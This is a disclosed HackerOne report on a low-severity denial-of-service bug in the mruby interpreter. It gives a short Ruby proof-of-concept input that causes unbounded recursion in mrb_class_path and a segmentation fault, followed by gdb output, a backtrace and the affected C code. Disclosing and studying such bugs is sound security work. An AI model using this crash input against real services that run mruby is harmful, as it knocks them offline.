# SIGSEGV - kh_get_n2s - in /src/symbol.c:37

## Report Details
- **Report ID**: 212456
- **URL**: https://hackerone.com/reports/212456
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-03-11T02:59:43.724Z
- **Disclosed**: 2017-04-27T21:20:29.675Z

## Reporter
- **Username**: mia_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The following code triggers the bug

```ruby
class<<Proc
class P class<<Proc
class P class P t end end
end end end
```

This is a Denial of Service bug.
A similar issue was reported in the past, but is still not fixed.

# Debugger

```gdb
(gdb) r in/62.txt 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/externalist/fuzzing/fuzzing_now/mruby_asan in/62.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000414f14 in kh_get_n2s (mrb=mrb@entry=0x602e0001fc60, h=h@entry=0x60080000bfd0, key=key@entry=0)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:37
37	KHASH_DEFINE (n2s, mrb_sym, mrb_sym, FALSE, sym_hash_func, sym_hash_equal)
(gdb) l
32	  return h;
33	}
34	#define sym_hash_equal(mrb,a, b) (mrb->symtbl[a].len == mrb->symtbl[b].len && memcmp(mrb->symtbl[a].name, mrb->symtbl[b].name, mrb->symtbl[a].len) == 0)
35	
36	KHASH_DECLARE(n2s, mrb_sym, mrb_sym, FALSE)
37	KHASH_DEFINE (n2s, mrb_sym, mrb_sym, FALSE, sym_hash_func, sym_hash_equal)
38	/* ------------------------------------------------------ */
39	
40	static void
41	sym_validate_len(mrb_state *mrb, size_t len)
```

# Backtrace

```
(gdb) bt
#0  0x0000000000414f14 in kh_get_n2s (mrb=mrb@entry=0x602e0001fc60, h=h@entry=0x60080000bfd0, key=key@entry=0)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:37
#1  0x0000000000415fba in sym_intern (mrb=mrb@entry=0x602e0001fc60, name=name@entry=0x518f80 "__outer__", len=len@entry=9, lit=lit@entry=1 '\001')
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:62
#2  0x00000000004166ef in mrb_intern_static (mrb=mrb@entry=0x602e0001fc60, name=name@entry=0x518f80 "__outer__", len=len@entry=9)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:101
#3  0x00000000004265bf in mrb_class_outer_module (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:130
#4  0x0000000000430673 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1583
#5  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#6  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#7  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#8  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#9  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#10 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#11 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#12 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#13 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#14 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#15 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#16 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#17 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#18 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
#19 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)
    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591
```

From here, you can see that it is recursively calling "mrb_class_path" indefinitely, until it reaches the stack bottom. When that happens, the program SEGFAULTS.

Code
```c
MRB_API mrb_value
mrb_class_path(mrb_state *mrb, struct RClass *c)
{
  mrb_value path;
  const char *name;
  mrb_sym classpath = mrb_intern_lit(mrb, "__classpath__");

  path = mrb_obj_iv_get(mrb, (struct RObject*)c, classpath);
  if (mrb_nil_p(path)) {
    struct RClass *outer = mrb_class_outer_module(mrb, c);
    mrb_sym sym = mrb_class_sym(mrb, c, outer);
    mrb_int len;

    if (sym == 0) {
      return mrb_nil_value();
    }
    else if (outer && outer != c && outer != mrb->object_class) {
      mrb_value base = mrb_class_path(mrb, outer);     // <- It's recursively calling the same function until it reaches the stack bottom.
      path = mrb_str_buf_new(mrb, 0);
      if (mrb_nil_p(base)) {
        mrb_str_cat_lit(mrb, path, "#<Class:");
        mrb_str_concat(mrb, path, mrb_ptr_to_str(mrb, outer));
        mrb_str_cat_lit(mrb, path, ">");
      }
      else {
        mrb_str_concat(mrb, path, base);
      }
      mrb_str_cat_lit(mrb, path, "::");
      name = mrb_sym2name_len(mrb, sym, &len);
      mrb_str_cat(mrb, path, name, len);
    }
    else {
      name = mrb_sym2name_len(mrb, sym, &len);
      path = mrb_str_new(mrb, name, len);
    }
    if (!MRB_FROZEN_P(c)) {
      mrb_obj_iv_set(mrb, (struct RObject*)c, classpath, path);
    }
  }
  return mrb_str_dup(mrb, path);
}
```

Since it is not possible to allocate memory below the stack, the exploitability of this bug is low. Hence, a Denial of Service bug.

## Attachments
No attachments
